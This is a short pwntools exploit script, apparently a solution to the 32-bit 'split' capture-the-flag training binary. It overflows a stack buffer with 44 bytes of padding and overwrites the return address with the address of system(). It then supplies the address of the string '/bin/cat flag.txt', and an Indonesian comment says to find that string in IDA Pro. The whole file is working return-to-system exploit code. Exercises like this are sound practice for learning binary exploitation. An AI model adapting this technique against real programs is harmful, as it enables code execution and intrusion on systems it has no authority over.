from pwn import *

p = process('./split32')
binary = ELF('./split32')

system = binary.symbols['system']
log.info('System : {}'.format(hex(system)))

payload = "A"*44
payload += p32(system)
payload += 'A'*4 #RBP 32 Bit
payload += p32(0x804A030) #address /bin/cat flag.txt tinggal cari string yang ada di ida pro 

p.sendline(payload)
p.interactive()